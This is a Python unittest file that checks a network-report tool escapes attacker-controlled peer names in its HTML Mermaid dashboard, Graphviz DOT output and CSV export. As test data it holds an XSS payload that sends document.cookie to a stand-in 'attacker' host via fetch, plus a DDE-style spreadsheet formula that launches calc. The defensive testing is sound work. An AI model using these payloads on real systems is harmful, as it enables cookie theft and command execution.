"""Regression tests for attacker-controlled text reaching report outputs.

Covers SEC-017 (stored XSS via the mermaid topology in the HTML dashboard) and
SEC-018 (spreadsheet formula injection in the CSV export).  Both reach the
report through ``peer_name``, which is populated from reverse DNS, from the SNI
ClientHello parser and from the unauthenticated /ingest endpoint.
"""

import os
import tempfile
import unittest

from commatrix import report
from commatrix.store import EdgeObservation, Store

XSS_PAYLOAD = '</pre><script>fetch("//attacker/c?"+document.cookie)</script><pre>'
CSV_PAYLOAD = "=cmd|'/C calc'!A0"


def _store_with(peer_name=None, process_comm=None, service_name="https"):
    tmp = tempfile.mkdtemp()
    store = Store(os.path.join(tmp, "t.db"))
    store.upsert_host("srv1", {})
    store.record_edge(
        "srv1",
        EdgeObservation(
            proto="tcp",
            direction="outbound",
            local_ip="10.0.0.1",
            peer_ip="203.0.113.9",
            service_port=443,
            peer_class="external",
            snapshot_bytes=1000,
            snapshot_packets=10,
            peer_name=peer_name,
            process_comm=process_comm,
            service_name=service_name,
        ),
    )
    return store


class MermaidEscapingTests(unittest.TestCase):
    def test_mermaid_label_escapes_html(self):
        out = report._mermaid_label(XSS_PAYLOAD)
        self.assertNotIn("<", out)
        self.assertNotIn(">", out)
        self.assertNotIn('"', out)
        self.assertIn("&lt;", out)

    def test_topology_mermaid_has_no_raw_payload(self):
        store = _store_with(peer_name=XSS_PAYLOAD)
        self.assertNotIn("<script>", report.topology_mermaid(store))

    def test_html_report_does_not_contain_executable_payload(self):
        store = _store_with(peer_name=XSS_PAYLOAD)
        html_out = report.report_html(store)
        self.assertNotIn("<script>fetch(", html_out)
        self.assertNotIn("</pre><script>", html_out)

    def test_mermaid_block_stays_inside_its_pre_element(self):
        store = _store_with(peer_name=XSS_PAYLOAD)
        html_out = report.report_html(store)
        start = html_out.index('<pre class="mermaid">')
        block = html_out[start : html_out.index("</pre>", start)]
        self.assertNotIn("<", block[len('<pre class="mermaid">') :])

    def test_label_length_is_capped(self):
        store = _store_with(peer_name="A" * 5000)
        self.assertNotIn("A" * (report.MAX_LABEL_LEN + 1), report.topology_mermaid(store))


class NodeIdTests(unittest.TestCase):
    def test_short_ids_are_unchanged(self):
        self.assertEqual(report._node_id("srv1"), "n_srv1")

    def test_long_ids_are_bounded(self):
        self.assertLess(len(report._node_id("A" * 5000)), 100)

    def test_long_ids_stay_unique(self):
        a = report._node_id("A" * 100 + "one")
        b = report._node_id("A" * 100 + "two")
        self.assertNotEqual(a, b)

    def test_id_is_syntactically_safe(self):
        bad = report._node_id('x" ]; evil [label="y')
        self.assertTrue(all(c.isalnum() or c == "_" for c in bad), bad)


class DotEscapingTests(unittest.TestCase):
    def test_quote_is_escaped_not_dropped(self):
        self.assertEqual(report._dot_label('a"b'), 'a\\"b')

    def test_backslash_is_escaped_before_quote(self):
        self.assertEqual(report._dot_label("a\\b"), "a\\\\b")

    def test_newline_cannot_terminate_statement(self):
        self.assertNotIn("\n", report._dot_label("a\nb"))

    def test_topology_dot_label_is_balanced(self):
        store = _store_with(peer_name='evil" ];  malicious [label="x')
        for line in report.topology_dot(store).splitlines():
            if "[label=" not in line:
                continue
            body = line.split("[label=", 1)[1]
            unescaped = body.replace('\\"', "")
            self.assertEqual(unescaped.count('"'), 2, line)


class CsvInjectionTests(unittest.TestCase):
    def test_formula_prefixes_are_neutralized(self):
        for payload in ("=1+1", "+1", "-1", "@SUM(A1)", "\tx", "\rx"):
            self.assertTrue(report.csv_safe(payload).startswith("'"), payload)

    def test_benign_values_are_untouched(self):
        for value in ("nginx", "203.0.113.9", "", "a=b"):
            self.assertEqual(report.csv_safe(value), value)

    def test_non_strings_pass_through(self):
        self.assertEqual(report.csv_safe(443), 443)
        self.assertIsNone(report.csv_safe(None))

    def test_export_neutralizes_process_and_peer_fields(self):
        store = _store_with(peer_name=CSV_PAYLOAD, process_comm=CSV_PAYLOAD)
        for line in report.matrix_csv(store).splitlines()[1:]:
            self.assertNotIn(",=cmd", line)
            self.assertIn("'=cmd", line)


if __name__ == "__main__":
    unittest.main()
